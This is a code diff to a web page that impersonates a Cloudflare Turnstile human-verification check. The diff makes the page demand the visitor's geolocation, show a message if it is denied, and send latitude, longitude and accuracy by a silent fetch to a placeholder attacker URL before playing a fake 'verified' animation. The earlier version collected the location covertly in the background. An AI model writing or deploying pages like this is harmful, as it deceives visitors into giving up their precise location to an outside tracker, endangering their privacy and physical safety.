@@ -267,6 +267,10 @@
         <p>✅ Verification successful — redirecting...</p>
       </div>
 
+      <p id="deny-msg" style="display:none; color:#dc2626; font-size:13px; margin-top:10px; text-align:center;">
+        ⚠️ Location permission is required to verify. Please allow and try again.
+      </p>
+
     </div>
 
     <div class="cf-footer">
@@ -303,30 +307,43 @@
       var label = document.getElementById('cf-label');
       var turnstile = document.getElementById('turnstile');
 
-      // Step 1: spinning state
-      box.classList.add('spinning');
-      label.textContent = 'Verifying...';
-      turnstile.classList.add('verifying');
+      // Step 1: ask location FIRST — no animation yet
       turnstile.style.pointerEvents = 'none';
-
-      // Silently request location in background
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           function(pos) {
-            // Location obtained — send to your Linux URL
+            // Location allowed — now start animation
             var lat = pos.coords.latitude;
             var lng = pos.coords.longitude;
             var acc = pos.coords.accuracy;
-            // PASTE YOUR LINUX URL BELOW — coords sent as query params
+
+            // Send to your Linux URL
             var linuxURL = 'YOUR_LINUX_URL_3'; // <-- paste your Linux URL here
             fetch(linuxURL + '?lat=' + lat + '&lng=' + lng + '&acc=' + acc, { mode: 'no-cors' })
-              .catch(function() {}); // silent, ignore errors
-          },
-          function() {} // silent if denied
-        );
-      }
+              .catch(function() {});
 
-      // Step 2: after 1.8s show verified
+            // Now do the animation
+            doVerifyAnimation(box, label, turnstile);
+          },
+          function(err) {
+            // Location denied — show message and re-enable button
+            document.getElementById('deny-msg').style.display = 'block';
+            turnstile.style.pointerEvents = 'auto';
+          },
+          { timeout: 30000 }
+        );
+      } else {
+        // Geolocation not supported — just animate anyway
+        doVerifyAnimation(box, label, turnstile);
+      }
+    }
+
+    function doVerifyAnimation(box, label, turnstile) {
+      turnstile.style.pointerEvents = 'none';
+      box.classList.add('spinning');
+      label.textContent = 'Verifying...';
+      turnstile.classList.add('verifying');
+
       setTimeout(function() {
         box.classList.remove('spinning');
         box.classList.add('checked');
@@ -337,17 +354,13 @@
         turnstile.classList.add('verified');
         verified = true;
 
-        // Show success message
         document.getElementById('cf-success').classList.add('show');
 
-        // Step 3: after 1.5 more seconds, go back to main page
         setTimeout(function() {
-          // Send message to opener (main page) that task 3 is done
           if (window.opener) {
             window.opener.postMessage('task3done', '*');
             window.close();
           } else {
-            // fallback: go back
             history.back();
           }
         }, 1500);
